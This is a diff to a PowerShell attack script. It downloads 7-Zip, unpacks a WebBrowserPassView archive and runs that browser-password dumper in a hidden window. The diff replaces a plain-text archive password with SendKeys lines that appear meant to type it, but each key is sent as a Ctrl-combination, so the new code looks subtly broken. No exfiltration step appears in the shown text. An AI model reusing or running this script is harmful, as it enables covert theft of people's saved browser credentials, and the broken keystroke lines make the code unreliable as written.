@@ -1,9 +1,3 @@
-$tmpfolderapp = "C:\temp\WebBrowserPassView.exe"
-
-if (Test-Path $tmpfolderapp) { 
-    Remove-Item $tmpfolderapp -Recurse -Force 
-}
-
 $tmpfolder = "C:\temp"
 
 if (Test-Path $tmpfolder) { 
@@ -19,7 +13,17 @@ Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 Expand-Archive '7z.zip'
 & '.\7z\7za.exe' e 'wbpv.zip'
 
-wbpv28821@
+[System.Windows.Forms.SendKeys]::SendWait('^w')
+[System.Windows.Forms.SendKeys]::SendWait('^b')
+[System.Windows.Forms.SendKeys]::SendWait('^p')
+[System.Windows.Forms.SendKeys]::SendWait('^v')
+[System.Windows.Forms.SendKeys]::SendWait('^2')
+[System.Windows.Forms.SendKeys]::SendWait('^8')
+[System.Windows.Forms.SendKeys]::SendWait('^8')
+[System.Windows.Forms.SendKeys]::SendWait('^2')
+[System.Windows.Forms.SendKeys]::SendWait('^1')
+[System.Windows.Forms.SendKeys]::SendWait('^@')
+
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
